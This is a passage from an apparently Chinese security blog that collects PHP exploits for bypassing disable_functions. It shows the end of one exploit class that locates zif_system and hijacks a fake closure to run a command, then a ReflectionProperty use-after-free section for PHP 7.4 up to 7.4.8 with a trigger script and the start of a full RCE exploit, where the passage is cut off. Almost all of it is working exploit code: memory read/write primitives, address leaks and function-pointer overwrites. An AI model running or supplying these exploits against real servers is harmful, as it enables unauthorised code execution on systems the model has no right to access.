class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;closure class_entry @ 0x%x&quot;</span>, <span class="hljs-variable">$closure_ce</span>);<br><br>        <span class="hljs-variable">$basic_funcs</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$closure_ce</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;basic_functions @ 0x%x&quot;</span>, <span class="hljs-variable">$basic_funcs</span>);<br><br>        <span class="hljs-variable">$zif_system</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;zif_system @ 0x%x&quot;</span>, <span class="hljs-variable">$zif_system</span>);<br><br>        <span class="hljs-variable">$fake_closure_off</span> = <span class="hljs-variable language_">$this</span>-&gt;helper_off + CHUNK_SIZE * <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x138</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$fake_closure_off</span> + <span class="hljs-variable">$i</span>, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$closure_addr</span> + <span class="hljs-variable">$i</span>));<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$fake_closure_off</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>);<br><br>        <span class="hljs-variable">$handler_offset</span> = PHP_MAJOR_VERSION === <span class="hljs-number">8</span> ? <span class="hljs-number">0x70</span> : <span class="hljs-number">0x68</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$fake_closure_off</span> + <span class="hljs-variable">$handler_offset</span>, <span class="hljs-variable">$zif_system</span>);<br><br>        <span class="hljs-variable">$fake_closure_addr</span> = <span class="hljs-variable language_">$this</span>-&gt;helper_addr + <span class="hljs-variable">$fake_closure_off</span> - <span class="hljs-variable language_">$this</span>-&gt;helper_off;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;helper_off + <span class="hljs-number">0x38</span>, <span class="hljs-variable">$fake_closure_addr</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;fake closure @ 0x%x&quot;</span>, <span class="hljs-variable">$fake_closure_addr</span>);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">cleanup</span>();<br>        (<span class="hljs-variable language_">$this</span>-&gt;helper-&gt;b)(CMD);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">make_uaf_obj</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;uafp = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;php://memory&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$this</span>-&gt;uafp, <span class="hljs-title function_ invoke__">pack</span>(<span class="hljs-string">&#x27;QQQ&#x27;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0xDEADBAADC0DE</span>));<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; STRING_SIZE; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$this</span>-&gt;uafp, <span class="hljs-string">&quot;\x00&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">prepare_leaker</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$str_off</span> = <span class="hljs-variable language_">$this</span>-&gt;helper_off + CHUNK_SIZE + <span class="hljs-number">8</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$str_off</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$str_off</span> + <span class="hljs-number">0x10</span>, <span class="hljs-number">6</span>);<br><br>        <span class="hljs-variable">$val_off</span> = <span class="hljs-variable language_">$this</span>-&gt;helper_off + <span class="hljs-number">0x48</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$val_off</span>, <span class="hljs-variable">$this</span>-&gt;helper_addr + CHUNK_SIZE + <span class="hljs-number">8</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$val_off</span> + <span class="hljs-number">8</span>, <span class="hljs-number">0xA</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">prepare_cleanup</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$ret_gadget</span> = <span class="hljs-variable">$binary_leak</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            --<span class="hljs-variable">$ret_gadget</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$ret_gadget</span>, <span class="hljs-number">1</span>) !== <span class="hljs-number">0xC3</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;ret gadget = 0x%x&quot;</span>, <span class="hljs-variable">$ret_gadget</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-number">0</span>, <span class="hljs-variable">$this</span>-&gt;abc_addr + <span class="hljs-number">0x20</span> - (PHP_MAJOR_VERSION === <span class="hljs-number">8</span> ? <span class="hljs-number">0x50</span> : <span class="hljs-number">0x60</span>));<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-number">8</span>, <span class="hljs-variable">$ret_gadget</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;helper_off + CHUNK_SIZE + <span class="hljs-number">16</span>, <span class="hljs-variable">$addr</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;helper-&gt;c);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$n</span> !== <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$value</span> &amp;= (<span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-variable">$n</span> &lt;&lt; <span class="hljs-number">3</span>)) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;abc[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span></span>) </span>&#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-comment">// In rare instances the standard module might lie after the addr we&#x27;re starting</span><br>            <span class="hljs-comment">// the search from. This will result in a SIGSGV when the search reaches an unmapped page.</span><br>            <span class="hljs-comment">// In that case, changing the direction of the search should fix the crash.</span><br>            <span class="hljs-comment">// $addr += 0x10;</span><br>            <span class="hljs-variable">$addr</span> -= <span class="hljs-number">0x10</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">4</span>) === <span class="hljs-number">0xA8</span> &amp;&amp;<br>                <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>),<br>                    [<span class="hljs-number">20151012</span>, <span class="hljs-number">20160303</span>, <span class="hljs-number">20170718</span>, <span class="hljs-number">20180731</span>, <span class="hljs-number">20190902</span>, <span class="hljs-number">20200930</span>])) &#123;<br>                <span class="hljs-variable">$module_name_addr</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">0x20</span>);<br>                <span class="hljs-variable">$module_name</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$module_name_addr</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$module_name</span> === <span class="hljs-number">0x647261646e617473</span>) &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;standard module @ 0x%x&quot;</span>, <span class="hljs-variable">$addr</span>);<br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">0x28</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">6</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> === <span class="hljs-number">0x6d6574737973</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> !== <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;hfp = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;php://memory&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$this</span>-&gt;hfp, <span class="hljs-title function_ invoke__">pack</span>(<span class="hljs-string">&#x27;QQ&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$this</span>-&gt;abc_addr));<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; FILTER_SIZE - <span class="hljs-number">0x10</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$this</span>-&gt;hfp, <span class="hljs-string">&quot;\x00&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params"><span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$n</span> - <span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$this</span>-&gt;abc[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-variable">$format</span>, <span class="hljs-variable">$val</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(LOGGING) &#123;<br>            <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$format&#125;</span>\n&quot;</span>, <span class="hljs-variable">$val</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">alloc</span>(<span class="hljs-params"><span class="hljs-variable">$size</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-variable">$size</span>));<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="php7-ReflectionProperty-UAF"><a href="#php7-ReflectionProperty-UAF" class="headerlink" title="php7_ReflectionProperty_UAF"></a>php7_ReflectionProperty_UAF</h2><p><strong>利用条件</strong></p><ul><li>7.4.x 版本上进行利用，最高可利用版本为 7.4.8。</li></ul><p><strong>原理</strong></p><p><a href="https://bugs.php.net/bug.php?id=79820">Use after free when type duplicated into ReflectionProperty gets resolved</a></p><p><strong>exp</strong></p><p>最简触发脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-built_in">stdClass</span> <span class="hljs-variable">$prop</span>;<br>&#125;<br><span class="hljs-variable">$rp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionProperty</span>(<span class="hljs-title class_">Test</span>::<span class="hljs-variable language_">class</span>, <span class="hljs-string">&#x27;prop&#x27;</span>);<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>;<br><span class="hljs-variable">$test</span>-&gt;prop = <span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$rp</span>-&gt;<span class="hljs-title function_ invoke__">getType</span>()-&gt;<span class="hljs-title function_ invoke__">getName</span>());<br></code></pre></td></tr></table></figure><p>rce</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> HelperHelperHelperHelperHelperHelperHelper <span class="hljs-variable">$prop</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelperHelperHelperHelperHelperHelperHelper</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">s2n</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">4</span>;<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>        <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-number">4</span> + <span class="hljs-variable">$i</span>]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">s2b</span>(<span class="hljs-params"><span class="hljs-variable">$str</span>, <span class="hljs-variable">$offset</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">s2n</span>(<span class="hljs-variable">$str</span>) + <span class="hljs-variable">$offset</span> - <span class="hljs-number">0x10</span>), <span class="hljs-number">8</span>, <span class="hljs-string">&quot;0&quot;</span>,<br>        STR_PAD_LEFT));<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> &lt; <span class="hljs-number">8</span>;<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$data</span> .= <span class="hljs-variable">$abc</span>[<span class="hljs-variable">$offset</span> + <span class="hljs-number">7</span> - <span class="hljs-variable">$i</span>];<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak2</span>(<span class="hljs-params"><span class="hljs-variable">$address</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$helper</span>;<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-number">0x20</span>, <span class="hljs-variable">$address</span>);<br>    <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span> -&gt; b);<br>    <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$leak</span>);<br>    <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-variable">$leak</span>, <span class="hljs-number">16</span>, <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT);<br>    <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$leak</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span>, <span class="hljs-variable">$data</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-variable">$data</span>, <span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>, STR_PAD_LEFT);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> &lt; <span class="hljs-number">8</span>;<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$abc</span>[<span class="hljs-variable">$offset</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-variable">$data</span>[<span class="hljs-number">7</span> - <span class="hljs-variable">$i</span>];<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$std_object_handlers</span></span>) </span>&#123;<br>    <span class="hljs-variable">$prefix</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$std_object_handlers</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>    <span class="hljs-variable">$std_object_handlers</span> = <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$std_object_handlers</span>));<br>    <span class="hljs-variable">$start</span> = <span class="hljs-variable">$std_object_handlers</span> &amp; <span class="hljs-number">0x00000000fffff000</span> | <span class="hljs-number">0x0000000000000920</span>;<br>    <span class="hljs-comment"># change 0x920 if finding failed</span><br><span class="hljs-variable">$NumPrefix</span> = <span class="hljs-variable">$std_object_handlers</span> &amp; <span class="hljs-number">0x0000ffffff000000</span>;<br><span class="hljs-variable">$NumPrefix</span> = <span class="hljs-variable">$NumPrefix</span> - <span class="hljs-number">0x0000000001000000</span>;<br><span class="hljs-variable">$funcs</span> = <span class="hljs-title function_ invoke__">get_defined_functions</span>()[<span class="hljs-string">&#x27;internal&#x27;</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>        <span class="hljs-variable">$name_addr</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$prefix</span> . <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$addr</span> - <span class="hljs-number">0x10</span>), <span class="hljs-number">8</span>,<br>                <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT))));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$name_addr</span>) &gt; <span class="hljs-variable">$std_object_handlers</span> || <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$name_addr</span>) &lt; <span class="hljs-variable">$NumPrefix</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-variable">$name_addr</span> = <span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-variable">$name_addr</span>, <span class="hljs-number">16</span>, <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT);<br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$prefix</span> . <span class="hljs-title function_ invoke__">s2b</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span 